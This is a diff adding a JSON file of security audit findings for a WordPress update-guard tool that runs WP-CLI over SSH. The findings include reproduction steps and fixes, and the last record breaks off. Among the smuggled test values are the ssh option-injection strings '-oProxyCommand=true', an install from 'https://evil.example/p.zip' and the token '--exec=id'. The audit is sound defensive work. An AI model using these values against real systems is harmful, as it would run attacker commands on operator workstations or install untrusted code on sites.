@@ -1,0 +1,796 @@
+[
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "guard.py:restore_items:inventory-name-wp-cli-install",
+    "title": "Rollback installs from stored inventory names with only shlex.quote",
+    "description": "inventory() stores remote plugin/theme list JSON in state.json with no schema, slug, or integrity check. restore_items skips only empty name/version or status==must-use, then runs plugin/theme install <name> --version=<version> --force for every remaining row (not only changed items). shlex.quote closes POSIX shell injection. Independent dry-run with dummy rows showed unquoted tokens in the ssh argv: plugin install --exec=id --version=1 --force, plugin install https://evil.example/p.zip --version=1.0 --force, and plugin install /tmp/evil.zip --version=2.0 --force. WP-CLI install also accepts zip URLs and filesystem paths, and may honor global flags if a name token begins with --. A lower-trust staging web or plugin principal who can influence list JSON, or any writer of state.json between snapshot and rollback, can expand which packages the deploy SSH user installs on staging. Rollback still uses site['staging'] only.",
+    "claimed_root_cause": "Restore treats snapshot inventory as an authorized install list: names and versions are not allowlisted as slugs/semver, not integrity-bound to the run, and not re-authorized before wp plugin/theme install --force.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 211,
+        "scope": "inventory",
+        "description": "Remote plugin list --format=json and theme list --format=json are json.loads with no schema or size check."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 344,
+        "scope": "cmd_snapshot",
+        "description": "Before snapshot writes that object to row['inventory'] and later save_json persists it in state.json with no MAC."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 427,
+        "scope": "restore_items",
+        "description": "Quoted name is the install positional and quoted version is --version=; ssh_wp then sends the string as the remote command."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 211,
+        "description": "Plugin and theme arrays are accepted from remote JSON without field allowlists."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 425,
+        "description": "must-use or missing name/version is the only restore filter; there is no slug or semver check."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 440,
+        "description": "cmd_rollback applies restore_items to site['staging'] for the full plugins and themes lists."
+      },
+      {
+        "file": "skills/wp-update-guard/references/wp-cli.md",
+        "line": 59,
+        "description": "Documented policy is to restore each plugin/theme that changed; the code restores every name+version row."
+      }
+    ],
+    "blockers": [
+      "Whether wp plugin list --format=json can emit a name that is a URL, path, or leading-dash token, and whether WP-CLI install treats that token as a zip source or global option, are WordPress/WP-CLI facts not visible in this repository; no local wp or php binary is present to observe install versus option-parse behavior"
+    ],
+    "validation_plan": {
+      "local": "Command-string shaping is already reproducible by importing restore_items/ssh_wp with dry_run=True and dummy inventory rows (normal slug, https URL, /tmp path, leading-dash token). Remaining local need: if a disposable WP-CLI binary is available offline, run those command strings against a fixture WordPress tree and observe install versus option-parse behavior.",
+      "deployment": "Owner checks what their WP-CLI plugin list emits for unusual plugin directory names and whether plugin install interprets a quoted --exec or URL positional as a package source when run as the deploy user."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "guard.py:ssh_wp:unvalidated-ssh-destination-argv",
+    "title": "Config ssh field is passed to OpenSSH without destination validation or --",
+    "description": "ssh_wp places sites[].staging.ssh and live.ssh into local OpenSSH argv as the destination after -o BatchMode=yes, with no leading-dash reject and no -- separator. validate_site accepts any http(s) URL and never reads ssh. Docs require user@host, put extra flags in ~/.ssh/config, and allow committing the file. A committed or planted wp-update-guard.json can set ssh to a leading-dash token such as -oProxyCommand=true. Independent dry-run of ssh_wp produced argv [ssh, -o, BatchMode=yes, -oProxyCommand=true, wp --path=/var/www/staging ...]. Local OpenSSH_9.6p1 -G (no connection) treated that token as an option: proxycommand became true and the next argument became the destination. That is local option injection, including ProxyCommand/LocalCommand/-F, which is stronger than choosing a destination host.",
+    "root_cause": "The ssh config string is placed in local ssh argv as a destination without a user@host allowlist, a leading-dash reject, or a -- separator.",
+    "intended_behavior": "sites[].*.ssh is only a user@host destination. Extra SSH options belong in ~/.ssh/config. OpenSSH must not treat the field as an option.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 68,
+        "scope": "find_config",
+        "description": "--config or the first wp-update-guard.json walking from cwd toward / supplies staging.ssh and live.ssh."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 110,
+        "scope": "validate_site",
+        "description": "Target objects are accepted when url is http(s). ssh and wp_path are not validated at load time."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 189,
+        "scope": "ssh_wp",
+        "description": "argv is [ssh, -o, BatchMode=yes, ssh, remote] with no -- before the config-controlled destination; subprocess.run uses that list."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 182,
+        "description": "Strongest ssh control is a non-empty string."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 186,
+        "description": "wp_path rejects .. and ;|& whitespace and is later shlex.quoted; that sibling control is not applied to ssh."
+      },
+      {
+        "file": "skills/wp-update-guard/references/config.md",
+        "line": 52,
+        "description": "Documented contract is user@host passed to ssh; extra flags belong in ~/.ssh/config."
+      },
+      {
+        "file": "skills/wp-update-guard/references/config.md",
+        "line": 61,
+        "description": "The JSON config may be committed if it has no secrets."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "wp-update-guard.json sets staging.ssh or live.ssh to a leading-dash token such as -oProxyCommand=true."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "An operator or agent runs a command that calls ssh_wp (update-staging, promote, rollback, or a non-dry-run snapshot inventory)."
+      },
+      {
+        "kind": "environmental_dependency",
+        "description": "Local OpenSSH treats a leading-dash argv token after -o BatchMode=yes as an option rather than a destination unless -- is present."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Someone who can commit or plant wp-update-guard.json in a project the operator or agent will run, but who should only be able to choose an SSH destination, not execute local commands.",
+      "payloads": [
+        "-oProxyCommand=true",
+        "-oProxyCommand=printf"
+      ],
+      "instructions": [
+        "Import skills/wp-update-guard/scripts/guard.py.",
+        "Call validate_site on a dummy site whose staging.ssh is -oProxyCommand=true and whose url is https://staging.example.com. Observe acceptance.",
+        "Call ssh_wp({'ssh': '-oProxyCommand=true', 'wp_path': '/var/www/staging'}, 'plugin list --format=json', dry_run=True). Record the returned command string and the argv list [ssh, -o, BatchMode=yes, -oProxyCommand=true, wp --path=/var/www/staging ...].",
+        "Without connecting to a host, run ssh -G -o BatchMode=yes -oProxyCommand=true and observe usage (no destination).",
+        "Without connecting to a host, run ssh -G -o BatchMode=yes -oProxyCommand=true dummyhost and read the dumped proxycommand and hostname lines."
+      ],
+      "observed_result": "validate_site accepted leading-dash ssh. ssh_wp dry_run returned: ssh -o BatchMode=yes -oProxyCommand=true 'wp --path=/var/www/staging plugin list --format=json'. ssh -G -o BatchMode=yes -oProxyCommand=true printed usage and exited 255 (token consumed as an option, no destination left). ssh -G -o BatchMode=yes -oProxyCommand=true dummyhost dumped hostname dummyhost and proxycommand true (OpenSSH_9.6p1). ssh -G on the dry-run-shaped argv with the wp string as the final token reported hostname contains invalid characters, showing that token became the destination after the injected option."
+    },
+    "remediation": {
+      "strategy": "Reject ssh values that are not user@host (at least reject a leading dash) and pass -- immediately before the destination so OpenSSH cannot parse the field as an option. Keep extra SSH settings in ~/.ssh/config as already documented.",
+      "code_changes": [
+        {
+          "file_name": "skills/wp-update-guard/scripts/guard.py",
+          "fixed_code": "SSH_DEST_RE = re.compile(r\"^[A-Za-z0-9._-]+@[A-Za-z0-9._-]+$\")\n\ndef validate_ssh_destination(value: object, label: str) -> str:\n    if not isinstance(value, str) or not value.strip():\n        raise GuardError(f\"{label} is missing\")\n    ssh = value.strip()\n    if ssh.startswith(\"-\") or not SSH_DEST_RE.fullmatch(ssh):\n        raise GuardError(f\"{label} must be user@host; put extra options in ~/.ssh/config\")\n    return ssh\n\ndef ssh_wp(target: dict[str, Any], command: str, *, dry_run: bool) -> str:\n    ssh = validate_ssh_destination(target.get(\"ssh\"), \"ssh target\")\n    wp_path = target.get(\"wp_path\")\n    if not isinstance(wp_path, str) or not wp_path.startswith(\"/\"):\n        raise GuardError(\"wp_path must be an absolute path\")\n    if \"..\" in wp_path or any(ch in wp_path for ch in \" \\t\\n;|&\"):\n        raise GuardError(\"wp_path looks unsafe\")\n    remote = f\"wp --path={shlex.quote(wp_path)} {command}\"\n    argv = [\"ssh\", \"-o\", \"BatchMode=yes\", \"--\", ssh, remote]\n    if dry_run:\n        return \" \".join(shlex.quote(part) for part in argv)\n    completed = subprocess.run(argv, check=False, capture_output=True, text=True, timeout=300)\n"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "The operator or agent must run a command that calls ssh_wp, and the config must contain a leading-dash ssh value. Docs allow committing that file, and the runbook drives those commands, but a normal operator-written user@host config is not enough by itself."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "OpenSSH option injection via ProxyCommand, LocalCommand, or -F runs attacker-chosen commands on the operator workstation, which holds SSH keys and can reach every configured WordPress host."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source, validate_site, and ssh_wp dry-run were reproduced locally. The same leading-dash token was independently shown to become an OpenSSH option on this host via ssh -G with dummy data and no live destination."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "wp-update-guard.guard.pass-predicate-omits-http-and-page-set",
+    "title": "Promote Pass ignores capture HTTP status and configured page set",
+    "description": "SKILL.md says a page Passes only with HTTP 200, matching size, and a pixel fraction under threshold, and that a page which will not load is a stop. capture-pages.mjs records status and ok, still writes a PNG for a non-200 goto success, and exits 1 when any page is not ok. guard.capture_pages treats that exit 1 as success and never reads report.ok or per-page status. compare-pages.py globs whatever PNGs exist and does not open capture.json. cmd_compare copies report.pass into pass_promote. Independently planting identical home.png files plus capture.json pages with status 500 and ok false, and omitting configured shop from both folders, made compare_dirs and cmd_compare set decision Pass and phase pass_promote. cmd_promote dry_run from that state emitted live plugin/theme update --all. If every configured page leaves no PNG, bool(pages) is false and compare fails; a missing key page is ignored whenever at least one other PNG pair matches.",
+    "root_cause": "The promote gate trusts compare.json pass, which is a directory-glob pixel verdict, while the capture HTTP status and the configured site.pages set are dropped at the guard handoff.",
+    "intended_behavior": "A Pass, and therefore live promote, should require every configured key page to have been captured with HTTP 200, an after screenshot of the same size, and a pixel fraction under threshold. An error status, a page that will not load, or a configured id missing from before or after must fail compare and must not set pass_promote.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 118,
+        "scope": "main",
+        "description": "Each successful goto stores status and ok; a screenshot is written even when status is not 200."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 251,
+        "scope": "capture_pages",
+        "description": "Return code 1 from a failed capture.ok report is accepted and the JSON is returned unchecked."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/compare-pages.py",
+        "line": 171,
+        "scope": "compare_dirs",
+        "description": "Pass is computed from globbed PNG stems, not from capture.json or the config page list."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 410,
+        "scope": "cmd_compare",
+        "description": "report.pass alone sets decision Pass and phase pass_promote, which cmd_promote uses to update live."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 505,
+        "scope": "cmd_run",
+        "description": "After compare sets pass_promote, run immediately applies live plugin/theme update --all without rechecking capture HTTP status or the configured page list."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 134,
+        "description": "Documented Pass requires HTTP 200 captured during snapshot, not only a pixel fraction."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 124,
+        "description": "The runbook says an error status or a page that will not load is a failed page and must not promote."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 251,
+        "description": "capture_pages allows subprocess return code 1, the capture-pages.mjs failure exit for !report.ok, and never reads report.ok."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/compare-pages.py",
+        "line": 178,
+        "description": "Overall pass is bool(pages) and all PNG rows pass; a configured id absent from both folders is not a failure."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 410,
+        "description": "cmd_compare sets pass_promote from report.pass only; it does not load before/after capture.json or site.pages."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Anonymous staging can return the same non-200 or login/error body before and after, which Playwright still screenshots on a successful goto."
+      },
+      {
+        "kind": "data_state",
+        "description": "At least one matching before/after PNG pair exists so compare_dirs sees a non-empty page list; omitted configured ids are then ignored."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "An operator or agent runs compare, or run, which auto-promotes once phase is pass_promote."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Local operator or agent using the documented Pass/promote path against a staging origin that serves the same error or login page, or that times out a configured key page while another page still yields matching PNGs.",
+      "payloads": [
+        "{\"pages\":[{\"id\":\"home\",\"status\":500,\"ok\":false},{\"id\":\"shop\",\"status\":500,\"ok\":false}],\"ok\":false}",
+        "identical 4x4 RGB home.png in before/ and after/; no shop.png",
+        "site.pages ids home,shop"
+      ],
+      "instructions": [
+        "Import compare-pages.py and guard.py. In a temp output_dir/runs/testrun/example-site, write identical home.png files under before/ and after/ plus capture.json pages with status 500 and ok false. Do not call capture-pages.mjs or SSH.",
+        "Call compare_dirs(before, after, 0.02). Observe pass true and only id home, with shop absent and not failed.",
+        "Call cmd_compare with phase screenshot_after, that run_id, and site.pages [home, shop]. Observe decision Pass and phase pass_promote.",
+        "Call cmd_promote(..., dry_run=True) from that row. Observe live plugin update --all and theme update --all command strings."
+      ],
+      "observed_result": "compare_dirs returned pass true, decision Pass, page_count 1, failed []. cmd_compare set row.phase to pass_promote and row.decision to Pass; shop was not in page_results. cmd_promote dry_run emitted ssh -o BatchMode=yes deploy@live.example.net 'wp --path=/var/www/live plugin update --all' and the matching theme update --all. Empty PNG dirs instead returned pass false."
+    },
+    "remediation": {
+      "strategy": "Fail closed on capture.ok and on the configured page set. capture_pages must treat exit 1 or report.ok false as an error. compare_dirs must take expected page ids and fail any id missing from before or after. cmd_compare must require each configured id to have capture status 200 on both sides before copying report.pass into pass_promote.",
+      "code_changes": [
+        {
+          "file_name": "skills/wp-update-guard/scripts/guard.py",
+          "fixed_code": "if completed.returncode != 0:\n        detail = (completed.stderr or completed.stdout or \"capture failed\").strip()\n        raise GuardError(detail[:800])\n    report_path = dest / \"capture.json\"\n    if report_path.is_file():\n        report = load_json(report_path)\n    else:\n        try:\n            report = json.loads(completed.stdout)\n        except json.JSONDecodeError as exc:\n            raise GuardError(\"screenshot capture did not return JSON\") from exc\n    if not report.get(\"ok\"):\n        raise GuardError(\"one or more key pages failed HTTP capture\")\n    return report"
+        },
+        {
+          "file_name": "skills/wp-update-guard/scripts/compare-pages.py",
+          "fixed_code": "def compare_dirs(before_dir: Path, after_dir: Path, threshold: float, expected_ids: list[str] | None = None) -> dict[str, object]:\n    found = {p.stem for p in before_dir.glob(\"*.png\")} | {p.stem for p in after_dir.glob(\"*.png\")}\n    names = sorted(set(expected_ids) | found) if expected_ids else sorted(found)\n    pages = [\n        {\"id\": name, **compare_images(before_dir / f\"{name}.png\", after_dir / f\"{name}.png\", threshold)}\n        for name in names\n    ]\n    if expected_ids is not None:\n        passed = bool(expected_ids) and all(page[\"pass\"] for page in pages)\n    else:\n        passed = bool(pages) and all(page[\"pass\"] for page in pages)\n    return {\n        \"pass\": passed,\n        \"decision\": \"Pass\" if passed else \"Rolled back\",\n        \"page_count\": len(pages),\n        \"failed\": [page[\"id\"] for page in pages if not page[\"pass\"]],\n        \"pages\": pages,\n        \"threshold\": threshold,\n    }"
+        },
+        {
+          "file_name": "skills/wp-update-guard/scripts/guard.py",
+          "fixed_code": "expected_ids = [str(page[\"id\"]) for page in site[\"pages\"]]\n    argv.extend([\"--ids\", \",\".join(expected_ids)])\n    # after loading report:\n    for side in (\"before\", \"after\"):\n        capture_path = dest / side / \"capture.json\"\n        capture = load_json(capture_path) if capture_path.is_file() else {}\n        by_id = {item.get(\"id\"): item for item in (capture.get(\"pages\") or []) if isinstance(item, dict)}\n        for page_id in expected_ids:\n            item = by_id.get(page_id) or {}\n            if item.get(\"status\") != 200 or item.get(\"ok\") is not True:\n                raise GuardError(f\"{side} capture for {page_id} is not HTTP 200\")\n    if report.get(\"pass\") and set(expected_ids) <= {page.get(\"id\") for page in report.get(\"pages\") or []}:\n        row[\"decision\"] = \"Pass\"\n        row[\"phase\"] = \"pass_promote\"\n    else:\n        row[\"decision\"] = \"Rolled back\"\n        row[\"phase\"] = \"fail_rollback\""
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "WordPress staging often serves the same login, maintenance, or error body before and after, and Playwright still writes a PNG. cmd_run then auto-promotes on a pixel-only Pass. Dual timeout of every page fails closed; the bypass needs at least one matching PNG pair."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Live receives plugin/theme update --all, and optional core update, when the documented HTTP 200 and key-page-set checks never ran. That can break a production WordPress site."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source lines match the trace. Dummy identical PNGs plus status-500 capture.json and a missing configured id independently produced pass_promote and live update --all dry-run argv without SSH or Playwright."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "wp-update-guard.guard.promote-unpinned-update-all",
+    "title": "Promote re-resolves latest channel updates instead of staging-tested versions",
+    "description": "User-facing copy says the same updates that passed on staging go to live. Staging rollback already knows how to pin: plugin/theme install NAME --version=VER --force from the before-inventory. Promote never records a post-update staging inventory and never sends those versions to live. It runs a second plugin update --all, theme update --all, and optional core update. The live consumer therefore installs whatever the WordPress.org channel (and the live installed set) resolves at promote time, which can differ from the staging-tested names and versions. A later failed SSH command leaves that live mutation in place because rollback is staging-only.",
+    "root_cause": "cmd_promote binds live installation to a fresh mutable update --all channel resolution rather than to the plugin/theme/core identity that existed on staging after the passing run.",
+    "intended_behavior": "After every key page passes, live should receive the plugin, theme, and optional core identities that existed on staging after the passing check. The runbook and promote summary claim those same updates go live. Rollback already pins install NAME --version=VER --force; promote should use an equivalent post-update pin instead of a second unbound update --all, and a later failed live SSH command must not be reported as Live.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 344,
+        "scope": "cmd_snapshot",
+        "description": "The only persisted inventory is taken before staging updates and is the old rollback set."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 361,
+        "scope": "cmd_update_staging",
+        "description": "Staging applies unpinned plugin update --all, theme update --all, and optional core update."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 462,
+        "scope": "cmd_promote",
+        "description": "Live repeats those same unpinned update --all commands and never reads inventory versions."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 427,
+        "description": "Rollback pins name and version from inventory; promote has no equivalent install --version path."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 476,
+        "description": "The promote summary claims the same updates are on the live site after an unbound update --all."
+      },
+      {
+        "file": "skills/wp-update-guard/references/wp-cli.md",
+        "line": 51,
+        "description": "The WP-CLI reference documents live promotion as plugin/theme update --all, not a pinned replay of staging versions."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 156,
+        "description": "The runbook tells the user the same updates go to live after every key page checks out."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "The OS invoker already has the promote CLI and live SSH; no extra auth is required once phase is pass_promote."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Promote requires live.ssh and live.wp_path; core update is added only when config.core_update is true."
+      },
+      {
+        "kind": "timing_dependency",
+        "description": "A newer channel release, or a live installed set that differs from staging, can make update --all resolve a different name or version than the passing staging run."
+      },
+      {
+        "kind": "third_party_dependency",
+        "description": "WP-CLI update --all re-resolves WordPress.org (or the live host's update channel) at promote time instead of a stored package identity."
+      },
+      {
+        "kind": "data_state",
+        "description": "A non-dry-run promote requires row.phase == pass_promote. The only stored inventory is the pre-update rollback set and is unused by promote."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A WordPress.org publisher, or any delay after the staging update, can change what live installs. The operator or agent follows the documented promote path after a Pass and treats the live WordPress tree as receiving the staging-tested set.",
+      "payloads": [
+        "plugin update --all",
+        "theme update --all",
+        "core update"
+      ],
+      "instructions": [
+        "Import skills/wp-update-guard/scripts/guard.py. Build a dummy site with live.ssh=deploy@live.example.net and live.wp_path=/var/www/live, plus a row with phase=pass_promote and inventory plugins/themes that include akismet@5.3.0, hello-dolly@1.7.2, and twentytwentyfour@1.0.",
+        "Call cmd_promote(site, row, {core_update: false}, dry_run=True). Expect ssh argv for live only: wp --path=/var/www/live plugin update --all and theme update --all, with no --version= and no inventory names.",
+        "Repeat with core_update true. Expect an additional live wp core update and still no inventory pin.",
+        "Call restore_items / cmd_rollback on the same inventory with dry_run=True. Expect staging plugin/theme install NAME --version=VER --force for each inventoried item, and live_changed false.",
+        "Replace inventory names with SHOULD-NOT-APPEAR and call cmd_promote again. The promote JSON must omit that name and still emit update --all."
+      ],
+      "observed_result": "Independent dummy dry-run: cmd_promote from pass_promote printed ssh -o BatchMode=yes deploy@live.example.net 'wp --path=/var/www/live plugin update --all' and the matching theme command; with core_update, also core update. Inventory names and --version= were absent even when inventory held akismet@5.3.0 and when it was replaced with SHOULD-NOT-APPEAR. The summary was 'Every key page passed. The same updates are on the live site.' restore_items on the same inventory produced plugin install akismet --version=5.3.0 --force and equivalent theme pins against staging only. cmd_promote source does not mention inventory or version. cmd_snapshot writes inventory only on the before path; cmd_update_staging stores the command strings, not post-update versions."
+    },
+    "remediation": {
+      "strategy": "After the staging update (or the after snapshot), persist a post-update inventory of plugin/theme/core identities. Promote by installing those exact names and versions on live (install NAME --version=VER --force, or update NAME --version=VER). Do not re-run plugin/theme/core update --all. If a later live SSH command fails, stop without marking Live and provide a live rollback using the same pins.",
+      "code_changes": [
+        {
+          "file_name": "skills/wp-update-guard/scripts/guard.py",
+          "fixed_code": "def cmd_update_staging(site, row, config, *, dry_run):\n    if not dry_run and row.get(\"phase\") not in (\"update_staging\", \"snapshot_before\"):\n        raise GuardError(\"update staging only after the before snapshot\")\n    commands = [\"plugin update --all\", \"theme update --all\"]\n    if config.get(\"core_update\"):\n        commands.append(\"core update\")\n    logs = []\n    for command in commands:\n        logs.append({\"command\": command, \"output\": ssh_wp(site[\"staging\"], command, dry_run=dry_run)})\n    if not dry_run:\n        row[\"updated\"] = commands\n        row[\"after_inventory\"] = inventory(site[\"staging\"], dry_run=False)\n        row[\"phase\"] = \"screenshot_after\"\n    return {\"updated\": logs, \"phase\": row[\"phase\"]}\n\ndef cmd_promote(site, row, config, *, dry_run):\n    if not dry_run and row.get(\"phase\") != \"pass_promote\":\n        raise GuardError(\"promote only after every key page passed\")\n    live = site.get(\"live\")\n    if not isinstance(live, dict) or not live.get(\"ssh\") or not live.get(\"wp_path\"):\n        raise GuardError(\"live ssh and wp_path are required to go live\")\n    after = row.get(\"after_inventory\") or {}\n    plugins = after.get(\"plugins\") or []\n    themes = after.get(\"themes\") or []\n    if not plugins and not themes and not config.get(\"core_update\"):\n        raise GuardError(\"promote needs the post-update staging inventory\")\n    restored = {\n        \"plugins\": restore_items(live, plugins, \"plugin\", dry_run=dry_run),\n        \"themes\": restore_items(live, themes, \"theme\", dry_run=dry_run),\n    }\n    if config.get(\"core_update\") and after.get(\"core\"):\n        ssh_wp(live, f\"core update --version={shlex.quote(str(after['core']))}\", dry_run=dry_run)\n    if not dry_run:\n        row[\"decision\"] = \"Live\"\n        row[\"phase\"] = \"done\"\n        row[\"error\"] = None\n    return {\n        \"updated\": restored,\n        \"phase\": row[\"phase\"],\n        \"decision\": \"Live\",\n        \"summary\": \"Every key page passed. The staging-tested plugin and theme versions are on the live site.\",\n    }"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Promote always re-issues unbound update --all. A different live package set is common, but a newer channel version than the passing staging run also needs a publish (or a divergent installed set) in the window between staging update and promote. Immediate promote often still resolves the same latest."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Live production can install plugin, theme, or core packages that were never visually checked. Rollback is staging-only, so a later failed live SSH command or a bad channel result stays on the live tree."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source lines and an independent dummy dry-run both show promote ignores inventory and emits live plugin/theme/core update --all with no --version=, while rollback pins install --version= from the pre-update inventory. The OS-sandbox blocker is not required for that observation."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "wp-update-guard.guard.rollback-refuses-screenshot-after",
+    "title": "Rollback refuses persisted screenshot_after after a fatal after-snapshot",
+    "description": "The coded restore path is cmd_rollback, and the product promise is that a broken staging update rolls staging back and leaves live alone. cmd_update_staging persists phase screenshot_after after the staging WP-CLI updates return, before any after-screenshot exists. A later after-snapshot fatal (Playwright missing exit 2, an uncaught fullPage screenshot throw with no capture.json, or any Node exit other than 0 or 1) raises GuardError before phase becomes compare. main() writes state.json only after a successful command, so the last saved phase stays screenshot_after. cmd_rollback then refuses because it allows only fail_rollback or compare. cmd_run retries snapshot after from that phase and never restores. Staging remains on the new, untested plugin/theme (and optional core) versions. cmd_compare still accepts screenshot_after, and missing after PNGs fail the compare, which is a manual escape hatch that rollback and run do not take. Live promote stays blocked on pass_promote.",
+    "root_cause": "cmd_rollback's phase allowlist omits screenshot_after (and update_staging), the persisted states after staging has already been mutated, and a fatal after-capture does not persist fail_rollback or invoke restore.",
+    "intended_behavior": "Once staging packages have been mutated, rollback and run must still restore the recorded inventory if after-capture fatals or the operator asks to roll back. The last persisted phase after a fatal after-snapshot must be rollbackable, and a GuardError must not leave screenshot_after as a dead-end that only retries screenshots.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 374,
+        "scope": "cmd_update_staging",
+        "description": "A successful staging plugin/theme/core update persists phase screenshot_after before any after-screenshot exists."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 251,
+        "scope": "capture_pages",
+        "description": "After-snapshot raises GuardError when capture-pages.mjs exits with a code other than 0 or 1."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 260,
+        "scope": "capture_pages",
+        "description": "Exit 1 with no capture.json and non-JSON stdout also raises, which is the uncaught fullPage screenshot-throw path."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 575,
+        "scope": "main",
+        "description": "state.json is written only after a successful command; a GuardError leaves the last screenshot_after row in place."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 434,
+        "scope": "cmd_rollback",
+        "description": "Restore runs only when phase is fail_rollback or compare, so inventory is not applied to staging."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 434,
+        "description": "The rollback gate is a closed allowlist of fail_rollback and compare; screenshot_after is omitted."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 374,
+        "description": "update-staging writes phase screenshot_after immediately after the remote updates return."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 45,
+        "description": "Missing Playwright exits 2, which capture_pages treats as fatal rather than a failed page set."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 112,
+        "description": "fullPage screenshot can throw before capture.json is written; that becomes a GuardError and does not advance phase."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 498,
+        "description": "cmd_run from screenshot_after only retries after-screenshots and never calls cmd_rollback."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 170,
+        "description": "The runbook tells the user a broken page rolls back on its own and that live is unchanged."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 69,
+        "description": "Documented screenshot_after means after screenshots are saved; the CLI uses that name for the pre-screenshot post-update state."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "A completed update-staging command has already persisted phase screenshot_after and a pre-update inventory (or cmd_run is resumed from that saved row)."
+      },
+      {
+        "kind": "environmental_dependency",
+        "description": "The after-snapshot fatals: Playwright missing (exit 2), uncaught screenshot throw with no capture.json (exit 1, non-JSON stdout), or any Node exit other than 0 or 1. Ordinary goto failures that still write capture.json are not this hole."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "The operator or agent follows rollback or run. They do not take the undocumented compare-then-rollback escape hatch."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Live promote remains gated on pass_promote, so the stuck phase cannot update the live host."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "An OS invoker or agent following SKILL.md after staging updates have already persisted phase screenshot_after, when the after-snapshot then fatals.",
+      "payloads": [
+        "phase=screenshot_after",
+        "screenshot capture did not return JSON"
+      ],
+      "instructions": [
